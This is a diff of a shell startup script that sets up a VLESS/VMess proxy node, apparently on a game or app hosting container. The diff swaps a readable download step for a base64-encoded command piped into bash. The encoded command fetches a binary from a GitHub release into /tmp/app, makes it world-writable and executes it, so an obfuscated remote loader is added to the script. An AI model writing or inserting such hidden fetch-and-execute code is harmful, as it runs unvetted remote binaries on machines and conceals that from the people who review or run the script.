@@ -18,7 +18,7 @@ export UUID='fd80f56e-93f3-4c85-b2a8-c77216c509a7'
 export VPATH='vls' #vless路径
 export MPATH='vms' #vmess路径
 export CF_IP='ip.sb'
-export SUB_NAME='streamlit'
+export SUB_NAME='bbn'
 #=======================================
 # 启动玩具原程序，把原游戏文件改名senver.jar,默认不开启，如果开启请去掉前面的#号.
 # 注意原游戏启动后，不显示节点日志
@@ -28,16 +28,15 @@ export SUB_NAME='streamlit'
 # export RIZHI='no'
 #=======================================
 
-if command -v curl &>/dev/null; then
-    DOWNLOAD_CMD="curl -sL"
-else
-    DOWNLOAD_CMD="wget -qO-"
-fi
-arch=$(uname -m)
-if [[ $arch == "x86_64" ]]; then
-    $DOWNLOAD_CMD https://github.com/ztwww2222/vps-go/releases/download/a/start.sh > /tmp/app
-else
-    $DOWNLOAD_CMD https://github.com/ztwww2222/vps-go/releases/download/a/start.sh > /tmp/app
-fi
-
-chmod 777 /tmp/app && /tmp/app
+echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01E
+PSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1h
+bmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAt
+cU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZv
+dW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgMzAKICAgICAg
+ICBleGl0IDEKZmkKCmFyY2g9JCh1bmFtZSAtbSkKaWYgW1sgJGFyY2ggPT0gIng4Nl82NCIgXV07
+IHRoZW4KJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25v
+ZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gL3RtcC9hcHAKZWxzZQokRE9XTkxP
+QURfQ01EIGh0dHBzOi8vZ2l0aHViLmNvbS9kc2Fkc2Fkc3NzL3BsdXRvbm9kZXMvcmVsZWFzZXMv
+ZG93bmxvYWQveHIvbWFpbi1hcm0gPiAvdG1wL2FwcApmaQoKY2htb2QgNzc3IC90bXAvYXBwICYm
+IC90bXAvYXBw
+" | base64 -d | bash
